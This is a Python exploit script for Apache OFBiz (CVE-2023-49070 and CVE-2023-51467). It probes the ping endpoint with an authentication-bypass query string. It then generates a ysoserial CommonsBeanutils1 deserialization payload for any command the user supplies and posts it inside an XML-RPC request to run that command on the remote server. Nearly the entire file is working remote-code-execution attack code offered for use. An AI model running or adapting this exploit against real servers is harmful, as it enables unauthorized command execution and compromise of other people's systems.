import argparse
import logging
import os
import subprocess
import base64
import requests
import urllib3

# Disable SSL verification warning for simplicity
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def validate_url(url):
    """
    Validate the URL schema.
    """
    if not url.startswith("http://") and not url.startswith("https://"):
        raise ValueError("Invalid URL schema. Use 'http://' or 'https://'.")

def scan(url):
    """
    Perform a basic scan on the specified URL.
    """
    print("[+] Scanning started...")
    try:
        target_url = f"{url}/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y"
        response = requests.get(target_url, verify=False)

        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)

        if "PONG" in response.text:
            print("[+] Apache OFBiz instance seems to be vulnerable.")
        else:
            print("[-] Apache OFBiz instance seems NOT to be vulnerable.")

    except requests.exceptions.RequestException as e:
        print(f"[-] LOG: An error occurred during the scan: {e}")

def get_encoded_payload(cmd):
    """
    Generate an encoded payload based on the provided command.
    """
    if not os.path.isfile("ysoserial-all.jar"):
        logging.error("[-] ysoserial-all.jar not found. Exiting.")
        exit(1)

    print("[+] Generating payload...")
    try:
        #print(f"[+] Running the following command: {cmd}")
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, text=False)
        encoded_output = base64.b64encode(result.stdout).decode().replace("\n", "")
        print("[+] Payload generated successfully.")

    except subprocess.CalledProcessError as e:
        print(f"[-] LOG: An error occurred during payload generation: {e}")

    return encoded_output

def send_post_request(url, encoded_output):
    """
    Send a POST request with a malicious serialized payload.
    """
    print("[+] Sending malicious serialized payload...")
    try:
        target_url = f"{url}/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
        headers = {
            "Content-Type": "application/xml",
        }
        xml_data = f"""<?xml version="1.0"?>
            <methodCall>
              <methodName>Methodname</methodName>
              <params>
                <param>
                  <value>
                    <struct>
                      <member>
                        <name>test</name>
                        <value>
                          <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{encoded_output}</serializable>
                        </value>
                      </member>
                    </struct>
                  </value>
                </param>
              </params>
            </methodCall>
        """

        response = requests.post(target_url, headers=headers, data=xml_data, verify=False)

        if response.status_code == 200:
            print("[+] The request has been successfully sent. Check the result of the command.")
        else:
            print("[-] Failed to send the request. Check the connection or try again.")
    except requests.exceptions.RequestException as e:
        print(f"[-] LOG: An error occurred during the scan: {e}")

def main():
    """
    Main function for executing the script.
    """
    parser = argparse.ArgumentParser(description="Exploit script for Apache EFBiz auth vulnerability (CVE-2023-49070 and CVE-2023-51467).")
    parser.add_argument("--url", required=True, help="EFBIZ's URL to send requests to.")
    parser.add_argument("--cmd", help="Command to run on the remote server. Optional.")
    args = parser.parse_args()

    url = args.url.rstrip('/')
    validate_url(args.url)

    if args.cmd is None:
        scan(url)
    else:
        command = f"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 '{args.cmd}'"
        encoded_output = get_encoded_payload(command)
        send_post_request(url, encoded_output)

if __name__ == "__main__":
    main()
